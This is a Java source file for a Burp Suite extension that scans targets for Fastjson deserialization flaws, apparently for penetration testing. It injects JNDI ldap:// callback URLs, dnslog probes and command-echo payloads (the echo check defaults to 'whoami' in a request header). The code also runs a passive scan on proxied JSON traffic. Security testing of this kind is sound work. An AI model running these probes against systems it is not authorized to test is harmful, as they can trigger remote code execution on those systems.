package burp.ui;

import burp.*;
import burp.bean.FastjsonBean;
import burp.utils.CustomScanIssue;
import burp.utils.HostThrottle;
import burp.utils.HttpMessageUtils;
import burp.utils.I18nUtils;
import burp.utils.JsonUtils;
import burp.utils.UrlCacheUtil;
import burp.utils.Utils;

import javax.swing.*;
import javax.swing.table.DefaultTableCellRenderer;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.net.URL;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReentrantLock;

import static burp.dao.ConfigDao.getConfig;
import static burp.dao.FastjsonDao.getFastjsonListsByType;

/** Fastjson 漏洞检测面板：四类 payload（jndi/version/dns/echo）的主动检测
 *  （右键菜单/扫描按钮）与基于 dnslog 回连的被动扫描（IHttpListener）。
 *  主动探测统一以 POST + application/json 重建请求（见 toJsonPostHeaders）；
 *  在 scanLock 内串行执行并对目标主机做 HostThrottle 限速，模态弹窗均在加锁前完成；
 *  结果入静态有界 ScanResultsStore（autoRefresh 开启时刷新表格）。 */
public class FastjsonUI extends AbstractScanUI {
    private JButton btnClear; // 清空按钮
    private JButton btnRefresh; // 刷新按钮
    private volatile boolean autoRefresh = true; // 控制是否自动刷新
    private JCheckBox autoRefreshCheckBox; // 自动刷新开关
    // FastjsonUI 专属表格引用，确保自动刷新始终通知本模块的模型。
    private JTable fastjsonTable;
    private JCheckBox passiveScanCheckBox; // 被动扫描复选框
    // 当前面板实例：静态检测入口（Check*）与 BurpExtender 的被动回调需经此定位到实例
    private static volatile FastjsonUI instance;
    /** 结果列表容量上限，超限淘汰最旧条目。 */
    private static final int MAX_LOG_ENTRIES = 2000;
    private static final ScanResultsStore<FastjsonEntry> fastjsonlog = new ScanResultsStore<>(MAX_LOG_ENTRIES, () -> {
        FastjsonUI ui = instance;
        // 与原有行为一致：仅在自动刷新开启时刷新表格
        if (ui != null && ui.autoRefresh) {
            ui.refreshTable();
        }
    });

    static List<FastjsonEntry> getFastjsonlog() {
        return fastjsonlog.list();
    }

    static void setCurrentlyDisplayedItem(IHttpRequestResponse item) {
        FastjsonUI ui = instance;
        if (ui != null) ui.currentlyDisplayedItem = item;
    }
    private volatile String dnslogValue; // dnslog 回连地址
    private volatile String ipValue;     // IP 回连地址
    private List<FastjsonBean> jndiPayloads = new ArrayList<>();
    private List<FastjsonBean> versionPayloads = new ArrayList<>();
    private List<FastjsonBean> dnsPayloads = new ArrayList<>();
    private List<FastjsonBean> echoPayloads = new ArrayList<>();
    private final Lock scanLock = new ReentrantLock();

    public static void resetAllCaches() {
        UrlCacheUtil.resetCache("fastjson");
    }

    @Override
    protected void setupScanUI() {
        instance = this;
        // 载入 DB 配置与 payload（编辑器已由基类 createEditors() 创建）
        dnslogValue = safeConfigValue("dnslog");
        ipValue = safeConfigValue("ip");
        jndiPayloads = snapshotPayloads(getFastjsonListsByType("jndi"));
        versionPayloads = snapshotPayloads(getFastjsonListsByType("version"));
        dnsPayloads = snapshotPayloads(getFastjsonListsByType("dns"));
        echoPayloads = snapshotPayloads(getFastjsonListsByType("echo"));

        fastjsonTable = new FastjsonTable(new FastjsonModel(), requestEditor, responseEditor);
        resultTable = fastjsonTable;
        btnClear = new JButton(I18nUtils.get("fastjson.button.clear"));
        btnRefresh = new JButton(I18nUtils.get("fastjson.button.refresh"));
        passiveScanCheckBox = new JCheckBox(I18nUtils.get("fastjson.checkbox.passive_scan"));
        autoRefreshCheckBox = new JCheckBox(I18nUtils.get("fastjson.checkbox.auto_refresh"));
        autoRefreshCheckBox.setSelected(true); // 默认开启自动刷新

        Utils.callbacks.registerHttpListener(this);
    }

    // 加载按钮事件
    @Override
    protected void loadSavedData() {
        // 清空按钮事件
        btnClear.addActionListener(new AbstractAction() {
            @Override
            public void actionPerformed(ActionEvent e) {
                // store.clear 内部加锁，与扫描线程的 add 互斥
                fastjsonlog.clear();
                UrlCacheUtil.resetCache("fastjson");  // 清空URL缓存
                if (requestEditor != null) requestEditor.setMessage(new byte[0], true);
                if (responseEditor != null) responseEditor.setMessage(new byte[0], false);
                refreshTable();
            }
        });

        // 刷新按钮事件
        btnRefresh.addActionListener(new AbstractAction() {
            @Override
            public void actionPerformed(ActionEvent e) {
                refreshTable();
            }
        });

        // 自动刷新开关事件
        autoRefreshCheckBox.addActionListener(e -> {
            setAutoRefreshValue(autoRefreshCheckBox.isSelected());
            if(autoRefreshCheckBox.isSelected()) {
                refreshTable(); // 当开启自动刷新时，立即进行一次刷新
            }
        });
        // 被动扫描复选框事件（联动基类 passiveScanEnabled）
        passiveScanCheckBox.addActionListener(e -> passiveScanEnabled = passiveScanCheckBox.isSelected());
    }

    // 刷新表格方法
    private void refreshTable() {
        refreshTableModel(fastjsonTable);
    }

    // 构建主界面（组件已在 setupScanUI 创建，编辑器由基类 createEditors 创建）
    @Override
    protected void setupCommonUI() {
        panel = new JPanel(new BorderLayout());

        // 顶部面板：清空/刷新/自动刷新/被动扫描
        JPanel topPanel = new JPanel(new FlowLayout(FlowLayout.LEFT, 5, 5));
        topPanel.add(btnClear);
        topPanel.add(btnRefresh);
        topPanel.add(autoRefreshCheckBox);
        topPanel.add(passiveScanCheckBox);
        panel.add(topPanel, BorderLayout.NORTH);

        // 第 6 列（payload）自定义渲染器：居中 + 悬停提示
        DefaultTableCellRenderer renderer = new DefaultTableCellRenderer() {
            @Override
            public Component getTableCellRendererComponent(JTable table, Object value, boolean isSelected, boolean hasFocus, int row, int column) {
                JLabel label = (JLabel) super.getTableCellRendererComponent(table, value, isSelected, hasFocus, row, column);
                label.setHorizontalAlignment(JLabel.CENTER);
                label.setHorizontalTextPosition(JLabel.CENTER);
                label.setIconTextGap(0);
                label.setMaximumSize(new Dimension(Integer.MAX_VALUE, label.getPreferredSize().height));
                label.setToolTipText((String) value); // 设置鼠标悬停时显示的提示文本
                return label;
            }
        };
        fastjsonTable.getColumnModel().getColumn(5).setCellRenderer(renderer);

        // 上下分割：结果表 / 请求响应编辑器
        JSplitPane mainsplitPane = new JSplitPane(JSplitPane.VERTICAL_SPLIT);
        mainsplitPane.setTopComponent(wrapResultsTable(fastjsonTable));
        mainsplitPane.setBottomComponent(buildEditorSplit());
        applyWeights(mainsplitPane, WEIGHT_TABLE_EDITOR);

        panel.add(mainsplitPane, BorderLayout.CENTER);
    }

    @Override
    public String getTabName() {
        return "Fastjson";
    }

    @Override
    protected String getScanName() {
        return "Fastjson";
    }

    @Override
    protected void doPassiveScan(IHttpRequestResponse[] requestResponses, boolean isManual) {
        for (IHttpRequestResponse rr : requestResponses) {
            performPassiveScan(rr);
        }
    }
    /** dnslog 主动检测（ScanTaskExecutor 池线程，经右键菜单调用）：未初始化面板时静默跳过。 */
    public static void CheckDnslog(IHttpRequestResponse[] responses) {
        FastjsonUI ui = instance;
        if (ui != null) {
            ui.CheckDnslogInternal(responses);
        }
    }

    private void CheckDnslogInternal(IHttpRequestResponse[] responses) {
        if (!hasValidResponse(responses)) {
            return;
        }
        if (dnslogValue == null || dnslogValue.trim().isEmpty()) {
            Utils.stderr.println(I18nUtils.get("fastjson.message.missing_dnslog"));
            return;
        }
        scanLock.lock();
        try{
            IHttpRequestResponse baseRequestResponse = responses[0];
            IRequestInfo analyzeRequest = Utils.helpers.analyzeRequest(baseRequestResponse);
            String extensionMethod = analyzeRequest.getMethod();
            URL dnsurl = analyzeRequest.getUrl();
            String url = analyzeRequest.getUrl().toString();
            List<String> headers = toJsonPostHeaders(analyzeRequest);
            String res = I18nUtils.get("fastjson.detection.dnslog");
            IHttpService iHttpService = baseRequestResponse.getHttpService();
            // payload 快照与 dnslog 地址在循环外各计算一次，避免每个 payload 重复构建
            List<FastjsonBean> dnsPayloads = snapshotPayloads(this.dnsPayloads);
            String dnslogPayload = Utils.generateDnsPayload(dnsurl, dnslogValue);
            for (FastjsonBean fastjson : dnsPayloads) {
                String fastjsonDnslog = fastjson.getValue();
                String fuzzPayload = fastjsonDnslog.replace("FUZZ", dnslogPayload);
                String jsonPayload = JsonUtils.encodeToJsonRandom(fuzzPayload);
                byte[] bytePayload = Utils.helpers.stringToBytes(jsonPayload);
                // Content-Length 必须随新 body 重算：buildHttpMessage 不会自动修正，
                // 否则目标按旧长度截断 JSON，autoType payload 解析失败，检测整体失效
                HttpMessageUtils.setContentLength(headers, bytePayload.length);
                byte[] postMessage = Utils.helpers.buildHttpMessage(headers, bytePayload); // 探测统一 POST+JSON，见 toJsonPostHeaders
                HostThrottle.throttle(hostKey(iHttpService));
                IHttpRequestResponse resp = Utils.callbacks.makeHttpRequest(iHttpService, postMessage);
                if (resp == null || resp.getResponse() == null) {
                    Utils.stderr.println("Fastjson scan skipped: target returned no response");
                    continue;
                }
                IResponseInfo iResponseInfo = Utils.callbacks.getHelpers().analyzeResponse(resp.getResponse());
                String statusCode = String.valueOf(iResponseInfo.getStatusCode());
                add(extensionMethod, url, statusCode, res, fuzzPayload,resp);
            }
        }finally {
            scanLock.unlock();
        }

    }

    /** echo 命令回显主动检测（ScanTaskExecutor 池线程）：未初始化面板时静默跳过。 */
    public static void CheckEchoVul(IHttpRequestResponse[] responses) {
        FastjsonUI ui = instance;
        if (ui != null) {
            ui.CheckEchoVulInternal(responses);
        }
    }

    private void CheckEchoVulInternal(IHttpRequestResponse[] responses) {
        if (!hasValidResponse(responses)) {
            return;
        }
        // 弹窗放在加锁前：挂着对话框不放会让 scanLock 阻塞其余三类主动检测
        String echoVul = showInputDialog(
                I18nUtils.get("fastjson.message.enter_echo"),
                I18nUtils.get("config.title.info"),
                null,
                "whoami"
        );
        if (echoVul == null || echoVul.trim().isEmpty()) {
            return;
        }
        // 命令要拼进请求头，剔除换行防止 CRLF 注入伪造额外头部
        echoVul = echoVul.replaceAll("[\\r\\n]", "");
        scanLock.lock();
        try{
            IHttpRequestResponse baseRequestResponse = responses[0];
            IRequestInfo analyzeRequest = Utils.helpers.analyzeRequest(baseRequestResponse);
            String extensionMethod = analyzeRequest.getMethod();
            String url = analyzeRequest.getUrl().toString();
            List<String> headers = toJsonPostHeaders(analyzeRequest);
            IHttpService iHttpService = baseRequestResponse.getHttpService();
            Iterator<FastjsonBean> iterator = snapshotPayloads(echoPayloads).iterator();
            headers.add("Accept-Cache: " + echoVul);
            while (iterator.hasNext()) {
                FastjsonBean fastjson = iterator.next();
                String fastjsonEcho = fastjson.getValue();
                byte[] bytePayload = Utils.helpers.stringToBytes(fastjsonEcho);
                // Content-Length 必须随新 body 重算：buildHttpMessage 不会自动修正，
                // 否则目标按旧长度截断 JSON，autoType payload 解析失败，检测整体失效
                HttpMessageUtils.setContentLength(headers, bytePayload.length);
                byte[] postMessage = Utils.helpers.buildHttpMessage(headers, bytePayload); // 探测统一 POST+JSON，见 toJsonPostHeaders
                HostThrottle.throttle(hostKey(iHttpService));
                IHttpRequestResponse resp = Utils.callbacks.makeHttpRequest(iHttpService, postMessage);
                if (resp == null || resp.getResponse() == null) {
                    Utils.stderr.println("Fastjson scan skipped: target returned no response");
                    continue;
                }
                IResponseInfo iResponseInfo = Utils.callbacks.getHelpers().analyzeResponse(resp.getResponse());
                String statusCode = String.valueOf(iResponseInfo.getStatusCode());
                List<String> headersResp = iResponseInfo.getHeaders();
                boolean containsContentAuth = false;
                for (String header : headersResp) {
                    if (header != null && header.toLowerCase().startsWith("content-auth:")) {
                        containsContentAuth = true;
                        break;
                    }
                }
                if (containsContentAuth) {
                    add(extensionMethod, url, statusCode, I18nUtils.get("fastjson.detection.echo_found"), fastjsonEcho, resp);
                    // 直接用 analyzeRequest 已解析的 URL 对象：原先 new URL(url)+抛异常会在极端情况下中断整个 payload 循环
                    IScanIssue issues = new CustomScanIssue(iHttpService, analyzeRequest.getUrl(),
                            new IHttpRequestResponse[]{resp},
                            "Fastjson echo", I18nUtils.get("fastjson.issue.echo"),
                            "High", "Certain");
                    Utils.callbacks.addScanIssue(issues);
                } else {
                    add(extensionMethod, url, statusCode, I18nUtils.get("fastjson.detection.echo_not_found"), fastjsonEcho, resp);
                }
            }
        }finally {
            scanLock.unlock();
        }
    }
    /** JNDI 主动检测（ScanTaskExecutor 池线程）：弹窗选择 DNS/IP 回连方式；未初始化面板时静默跳过。 */
    public static void CheckJNDIVul(IHttpRequestResponse[] responses) {
        FastjsonUI ui = instance;
        if (ui != null) {
            ui.CheckJNDIVulInternal(responses);
        }
    }

    private void CheckJNDIVulInternal(IHttpRequestResponse[] responses) {
        if (!hasValidResponse(responses)) {
            return;
        }
        // 弹窗与回连地址校验放在加锁前：scanLock 持有时等待用户操作会阻塞其余主动检测
        String[] options = {"DNS", "IP"};
        String selectedValue = showInputDialog(
                I18nUtils.get("fastjson.dialog.select_type"),
                I18nUtils.get("fastjson.dialog.tip"),
                options,
                "IP"
        );
        if (selectedValue == null) {
            return;
        }
        String jndiStr = Objects.equals(selectedValue, "DNS") ? dnslogValue : ipValue;
        if (jndiStr == null || jndiStr.trim().isEmpty()) {
            Utils.stderr.println(I18nUtils.get("fastjson.message.missing_dnslog"));
            return;
        }
        scanLock.lock();
        try {
            IHttpRequestResponse baseRequestResponse = responses[0];
            IRequestInfo analyzeRequest = Utils.helpers.analyzeRequest(baseRequestResponse);
            String extensionMethod = analyzeRequest.getMethod();
            String url = analyzeRequest.getUrl().toString();
            List<String> headers = toJsonPostHeaders(analyzeRequest);
            IHttpService iHttpService = baseRequestResponse.getHttpService();
            for (FastjsonBean payload : snapshotPayloads(jndiPayloads)) { // payload 快照仅含非空条目，循环内无需再次过滤
                String dnslogKey = "";

                String fastjsonJNDI = payload.getValue();
                String id = String.valueOf(payload.getId());
                if (selectedValue.equals("DNS")) {
                    dnslogKey = "ldap://" + id + "." + jndiStr;
                } else {
                    dnslogKey = "ldap://" + jndiStr + "/" + id;
                }
                String fuzzPayload = fastjsonJNDI.replace("FUZZ", dnslogKey);
                String jsonPayload = JsonUtils.encodeToJsonRandom(fuzzPayload);
                byte[] bytePayload = Utils.helpers.stringToBytes(jsonPayload);
                // Content-Length 必须随新 body 重算：buildHttpMessage 不会自动修正，
                // 否则目标按旧长度截断 JSON，autoType payload 解析失败，检测整体失效
                HttpMessageUtils.setContentLength(headers, bytePayload.length);
                byte[] postMessage = Utils.helpers.buildHttpMessage(headers, bytePayload); // 探测统一 POST+JSON，见 toJsonPostHeaders
                HostThrottle.throttle(hostKey(iHttpService));
                IHttpRequestResponse resp = Utils.callbacks.makeHttpRequest(iHttpService, postMessage);
                if (resp == null || resp.getResponse() == null) {
                    Utils.stderr.println("Fastjson scan skipped: target returned no response");
                    continue;
                }
                IResponseInfo iResponseInfo = Utils.callbacks.getHelpers().analyzeResponse(resp.getResponse());
                String statusCode = String.valueOf(iResponseInfo.getStatusCode());
                add(extensionMethod, url, statusCode, I18nUtils.get("fastjson.detection.jndi"), fuzzPayload, resp);
            }
        }finally {
            scanLock.unlock();
        }
    }
    /** 版本探测主动检测（ScanTaskExecutor 池线程）：未初始化面板时静默跳过。 */
    public static void CheckVersion(IHttpRequestResponse[] responses) {
        FastjsonUI ui = instance;
        if (ui != null) {
            ui.CheckVersionInternal(responses);
        }
    }

    private void CheckVersionInternal(IHttpRequestResponse[] responses) {
        if (!hasValidResponse(responses)) {
            return;
        }
        scanLock.lock();
        try{
            IHttpRequestResponse baseRequestResponse = responses[0];
            IRequestInfo analyzeRequest = Utils.helpers.analyzeRequest(baseRequestResponse);
            String extensionMethod = analyzeRequest.getMethod();
            String url = analyzeRequest.getUrl().toString();
            List<String> headers = toJsonPostHeaders(analyzeRequest);
            IHttpService iHttpService = baseRequestResponse.getHttpService();
            for (FastjsonBean fastjson : snapshotPayloads(versionPayloads)) {
                String fastjsonVersion = fastjson.getValue();
                byte[] bytePayload = Utils.helpers.stringToBytes(fastjsonVersion);
                // Content-Length 必须随新 body 重算：buildHttpMessage 不会自动修正，
                // 否则目标按旧长度截断 JSON，autoType payload 解析失败，检测整体失效
                HttpMessageUtils.setContentLength(headers, bytePayload.length);
                byte[] postMessage = Utils.helpers.buildHttpMessage(headers, bytePayload); // 探测统一 POST+JSON，见 toJsonPostHeaders
                HostThrottle.throttle(hostKey(iHttpService));
                IHttpRequestResponse resp = Utils.callbacks.makeHttpRequest(iHttpService, postMessage);
                if (resp == null || resp.getResponse() == null) {
                    Utils.stderr.println("Fastjson scan skipped: target returned no response");
                    continue;
                }
                IResponseInfo iResponseInfo = Utils.callbacks.getHelpers().analyzeResponse(resp.getResponse());
                String statusCode = String.valueOf(iResponseInfo.getStatusCode());
                add(extensionMethod, url, statusCode, I18nUtils.get("fastjson.detection.version"), fastjsonVersion, resp);
            }
        }finally {
            scanLock.unlock();
        }
    }
    // 添加日志（容量淘汰与表格刷新由 store 统一处理）
    /** 追加一条扫描结果到有界 store（自动按 autoRefresh 刷新表格）。 */
    private void add(String extensionMethod, String url, String status, String res,String req, IHttpRequestResponse baseRequestResponse) {
        fastjsonlog.add(id -> new FastjsonEntry(id, extensionMethod, url, status, res, req, baseRequestResponse));
    }

    /** 目标主机限流键（HostThrottle 按 host:port 独立限速）。 */
    private static String hostKey(IHttpService service) {
        return service.getProtocol() + "://" + service.getHost() + ":" + service.getPort();
    }

    /** 主动探测统一以 POST + application/json 发送：请求行按原路径重写、
     *  Content-Type 强制替换。沿用原始请求行/头会出现 GET+JSON body 畸形包或
     *  表单 Content-Type 导致目标根本不解析 JSON，检测静默假阴性。 */
    private static List<String> toJsonPostHeaders(IRequestInfo requestInfo) {
        List<String> headers = new ArrayList<>(requestInfo.getHeaders());
        if (!headers.isEmpty()) {
            String[] parts = headers.get(0).split(" ");
            if (parts.length >= 3) {
                headers.set(0, "POST " + parts[1] + " HTTP/1.1");
            }
        }
        headers.removeIf(h -> Utils.headerNameMatches(h, "Content-Type"));
        headers.add("Content-Type: application/json");
        return headers;
    }
    /** 设置自动刷新开关（经 instance 定位，未初始化时静默跳过）。 */
    public static void setAutoRefresh(boolean value) {
        FastjsonUI ui = instance;
        if (ui != null) {
            ui.setAutoRefreshValue(value);
        }
    }

    private void setAutoRefreshValue(boolean value) {
        autoRefresh = value;
    }

    /** 设置 dnslog 地址（ConfigUI 保存时调用）：实例 volatile 值即时生效。 */
    public static void setDnslog(String value) {
        FastjsonUI ui = instance;
        if (ui != null) {
            ui.dnslogValue = value == null ? "" : value;
        }
    }

    /** 设置回连 IP（ConfigUI 保存时调用）：实例 volatile 值即时生效。 */
    public static void setIp(String value) {
        FastjsonUI ui = instance;
        if (ui != null) {
            ui.ipValue = value == null ? "" : value;
        }
    }

    /** 被动 dns 探测仅消费代理/爬虫流量（窄于基类默认）：Repeater/Intruder 等是
     *  测试者手工流量，主动检测已有右键入口，被动再打一遍只会放大回连流量。 */
    @Override
    protected boolean isPassiveScanSource(int toolFlag) {
        return toolFlag == IBurpExtenderCallbacks.TOOL_PROXY
                || toolFlag == IBurpExtenderCallbacks.TOOL_SPIDER;
    }

    /** 被动扫描监听（Burp 代理监听线程）：仅轻量过滤后提交统一有界池，去重延后到 performPassiveScan。 */
    @Override
    public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo) {
        // 只做轻量过滤（开关/方向/来源/静态资源/POST JSON），不做 URL 去重——
        // 去重会"消费"键：若在开关关闭期间执行，之后开启被动时同 URL 永远不会被扫描。
        // 真正的去重已移入 performPassiveScan（确认要扫时才消费）。
        if (!passiveScanEnabled || messageIsRequest || !isPassiveScanSource(toolFlag)) {
            return;
        }
        if (messageInfo == null || messageInfo.getRequest() == null || messageInfo.getResponse() == null) {
            return;
        }

        IRequestInfo requestInfo = Utils.helpers.analyzeRequest(messageInfo);
        String url = requestInfo.getUrl().toString();
        String method = requestInfo.getMethod();
        List<String> headers = requestInfo.getHeaders();

        // 检查是否为静态资源
        if (Utils.isUrlBlackListSuffix(url)) {
            return;
        }

        // 检查是否为POST请求且Content-Type为JSON
        if (!"POST".equalsIgnoreCase(method)) {
            return;
        }

        boolean isJson = false;
        for (String header : headers) {
            if (header.toLowerCase().contains("content-type") &&
                    header.toLowerCase().contains("application/json")) {
                isJson = true;
                break;
            }
        }

        if (!isJson) {
            return;
        }

        // 网络探测放入统一有界线程池，避免阻塞 Burp HTTP Listener。
        startPassiveScan(new IHttpRequestResponse[]{messageInfo}, false);
    }

    /** 对单个请求执行被动 dnslog 检测（ScanTaskExecutor 池线程）：确认要扫时才消费去重键。 */
    private void performPassiveScan(IHttpRequestResponse baseRequestResponse) {
        try {
            IRequestInfo analyzeRequest = Utils.helpers.analyzeRequest(baseRequestResponse);
            String url = analyzeRequest.getUrl().toString();
            String method = analyzeRequest.getMethod();
            List<String> headers = new ArrayList<>(analyzeRequest.getHeaders());
            // 被动扫描依赖 dnslog 回连，未配置时先跳过：此时不消费去重键，
            // 否则用户之后配置好 dnslog，该 URL 也永远不会再被动扫描（除非点清空）
            if (dnslogValue == null || dnslogValue.trim().isEmpty()) {
                return;
            }
            // payload 快照为空（dns 类种子缺失）时直接跳过且不消费去重键，
            // 否则该 URL 被标记"已扫"却实际一包未发
            List<FastjsonBean> dnsPayloads = snapshotPayloads(this.dnsPayloads);
            if (dnsPayloads.isEmpty()) {
                return;
            }
            // 去重在确认要扫描时消费（LruSet 线程安全，无需 listener 线程预消费）
            if (!UrlCacheUtil.checkUrlUnique("fastjson", method, analyzeRequest.getUrl(), new ArrayList<>())) {
                return;
            }
            IHttpService httpService = baseRequestResponse.getHttpService();
            URL dnsurl = analyzeRequest.getUrl();
            String dnslogPayload = Utils.generateDnsPayload(dnsurl, dnslogValue);
            for (FastjsonBean fastjson : dnsPayloads) {
                String fastjsonDnslog = fastjson.getValue();
                String fuzzPayload = fastjsonDnslog.replace("FUZZ", dnslogPayload);
                String jsonPayload = JsonUtils.encodeToJsonRandom(fuzzPayload);
                byte[] bytePayload = Utils.helpers.stringToBytes(jsonPayload);
                HttpMessageUtils.setContentLength(headers, bytePayload.length);
                byte[] postMessage = Utils.helpers.buildHttpMessage(headers, bytePayload);

                HostThrottle.throttle(hostKey(httpService));
                IHttpRequestResponse resp = Utils.callbacks.makeHttpRequest(httpService, postMessage);
                if (resp == null || resp.getResponse() == null) {
                    Utils.stderr.println("Fastjson passive scan skipped: target returned no response");
                    continue;
                }
                IResponseInfo responseInfo = Utils.helpers.analyzeResponse(resp.getResponse());
                String statusCode = String.valueOf(responseInfo.getStatusCode());

                // 记录扫描结果
                add(method, url, statusCode, I18nUtils.get("fastjson.detection.passive_dns"), fuzzPayload, resp);
            }
        } catch (Exception e) {
            Utils.stderr.println("Passive scan error: " + e.getMessage());
        }
    }


    private static String showInputDialog(String message, String title, Object[] options, Object initialValue) {
        final String[] result = new String[1];
        Runnable dialog = () -> result[0] = (String) JOptionPane.showInputDialog(
                null, message, title, JOptionPane.PLAIN_MESSAGE, null, options, initialValue);
        if (SwingUtilities.isEventDispatchThread()) {
            dialog.run();
            return result[0];
        }
        try {
            SwingUtilities.invokeAndWait(dialog);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            Utils.stderr.println("Fastjson dialog interrupted");
        } catch (java.lang.reflect.InvocationTargetException e) {
            Utils.stderr.println("Fastjson dialog failed: " + e.getCause());
        }
        return result[0];
    }

    private static boolean hasValidResponse(IHttpRequestResponse[] responses) {
        return responses != null && responses.length > 0 && responses[0] != null
                && Utils.helpers != null && Utils.callbacks != null;
    }

    private String safeConfigValue(String key) {
        try {
            burp.bean.ConfigBean config = getConfig("config", key);
            return config == null || config.getValue() == null ? "" : config.getValue();
        } catch (Exception e) {
            Utils.stderr.println("Fastjson config load failed for " + key + ": " + e.getMessage());
            return "";
        }
    }

    private static List<FastjsonBean> snapshotPayloads(List<FastjsonBean> payloads) {
        List<FastjsonBean> snapshot = new ArrayList<>();
        if (payloads == null) {
            return snapshot;
        }
        for (FastjsonBean payload : payloads) {
            if (payload != null && payload.getValue() != null && !payload.getValue().trim().isEmpty()) {
                snapshot.add(payload);
            }
        }
        return snapshot;
    }

}
